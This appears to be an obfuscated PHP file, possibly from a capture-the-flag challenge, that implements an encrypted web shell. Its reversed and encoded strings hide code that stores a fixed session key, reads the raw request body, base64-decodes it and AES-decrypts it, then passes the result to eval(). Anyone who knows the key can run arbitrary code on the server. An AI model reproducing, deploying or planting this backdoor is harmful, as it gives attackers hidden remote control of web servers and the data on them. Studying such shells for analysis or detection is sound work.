<?php

/*
-- EnPHP v2: http://enphp.djunny.com/
*/
echo "source in /source.txt\n";
0;
function func_0()
{
    $var_0 = func_get_args();
    $var_12 = 5619;
    if ($var_0[2] == $var_12 + 0x28) {
        return 'openssl_decrypt';
    }
    if ($var_0[2] == $var_12 + 0x8b) {
        return 'AES128';
    }
    if ($var_0[2] == $var_12 + 0xc4) {
        return parse_str('ZXhwbG9kZQ', $var_13) || $var_13 ? base64_decode(key($var_13)) : "";
    }
    if ($var_0[0] == $var_12 + 0x114) {
        return "|";
    }
}
function func_1()
{
    $var_14 = 9055;
    $var_15 = func_get_args();
    if ($var_15[2] == $var_14 + 0x1c) {
        return 'strrev';
    }
    if ($var_15[2] == $var_14 + 0x7c) {
        return 'stnetnoc_teg_elif';
    }
    if ($var_15[0] == $var_14 + 0xca) {
        return 'tupni//:php';
    }
    if ($var_15[2] == $var_14 + 0xe8) {
        return 'lssnepo';
    }
    if (func_get_arg(0x1) == $var_14 + 0x112) {
        return "edoced_46esab";
    }
}
function func_2()
{
    $var_16 = func_get_args();
    $var_11 = 9441;
    if ($var_16[2] == $var_11 + 0x2b) {
        return 'error_reporting';
    }
    if ($var_16[0] == $var_11 + 0x52) {
        return 'session_start' ?: $var_18;
    }
    if ($var_16[2] == $var_11 + 0x71) {
        return '913cf137f2f6986f';
    }
    if ($var_16[0] == $var_11 + 0xb4) {
        return 'k' ?: $var_17;
    }
    if ($var_16[2] == $var_11 + 0xd3) {
        return parse_str('c2Vzc2lvbl93cml0ZV9jbG9zZQ', $var_5) || $var_5 ? base64_decode(key($var_5)) : "";
    }
}
@func_2(0x251d, 0x2528, 0x250c)(0);
func_2(0x2533)();
$var_4 = func_2(0x256e, 0x2589, 0x2552, $var_4);
$_SESSION[func_2(0x2595)] = $var_4;
func_2(0x25db, 0x25f3, 0x25b4)();
$var_3 = func_1(0x23a1, 0x23ce, 0x237b)(func_1(0x23ea, 0x240a, 0x23db))(func_1(0x23a1, 0x23ce, 0x237b)(func_1(0x2429)));
if (!extension_loaded(strrev(func_1(0x2455, 0x2464, 0x2447)))) {
    $var_1 = func_1(0x23a1, 0x23ce, 0x237b)(func_1(0x2494, 0x2471));
    $var_3 = $var_1($var_3 . "");
    $var_2 = 0;
    while ($var_2 < strlen($var_3)) {
        $var_3[$var_2] = 0;
        $var_2++;
    }
} else {
    $var_3 = func_0(0x1643, 0x1663, 0x161b)($var_3, func_0(0x169e, 0x16a9, 0x167e), $var_4);
}
$var_9 = func_0(0x16e6, 0x16f2, 0x16b7)(func_0(0x1707), $var_3);
$var_10 = $var_9[0];
$var_6 = $var_9[1];
class C
{
    public function __invoke($var_8)
    {
        eval($var_8 . (parse_str("", $var_7) || $var_7 ? base64_decode(key($var_7)) : ""));
    }
}
@call_user_func(new C(), $var_6);